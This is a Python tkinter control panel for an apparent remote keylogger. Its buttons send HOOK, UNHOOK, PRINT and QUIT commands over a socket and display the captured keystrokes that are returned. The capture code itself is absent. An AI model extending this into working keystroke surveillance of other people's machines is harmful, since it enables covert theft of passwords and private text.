import tkinter as tk
import threading

class KeylogForm:
    def __init__(self, client):
        self.client = client

        self.root = tk.Tk()
        self.root.title("Keystroke")

        self.txtKQ = tk.Text(self.root, wrap=tk.WORD, height=10, width=50)
        self.txtKQ.configure(state='disabled')
        self.txtKQ.pack()

        self.button1 = tk.Button(self.root, text="Hook", command=self.button1_Click)
        self.button1.pack()

        self.button2 = tk.Button(self.root, text="Unhook", command=self.button2_Click)
        self.button2.pack()

        self.button3 = tk.Button(self.root, text="In phím", command=self.button3_Click)
        self.button3.pack()

        self.butXoa = tk.Button(self.root, text="Xóa", command=self.butXoa_Click)
        self.butXoa.pack()

        self.root.protocol("WM_DELETE_WINDOW", self.form_closing)

    def start(self):
        self.root.mainloop()

    def button1_Click(self):
        self.send_message("HOOK")

    def button2_Click(self):
        self.send_message("UNHOOK")

    def button3_Click(self):
        self.send_message("PRINT")
        data = self.receive_data(5000)
        self.txtKQ.configure(state='normal')
        self.txtKQ.insert(tk.END, data)
        self.txtKQ.configure(state='disabled')

    def butXoa_Click(self):
        self.txtKQ.configure(state='normal')
        self.txtKQ.delete("1.0", tk.END)
        self.txtKQ.configure(state='disabled')

    def form_closing(self):
        self.send_message("QUIT")
        self.root.destroy()

    def send_message(self, message):
        if self.client:
            self.client.sendall(message.encode())

    def receive_data(self, size):
        data = b""
        while len(data) < size:
            try:
                chunk = self.client.recv(size - len(data))
                if not chunk:
                    break
                data += chunk
            except:
                break
        return data.decode()

if __name__ == "__main__":
    client = None  # Replace this with your actual client socket object
    keylog_form = KeylogForm(client)
    keylog_form.start()
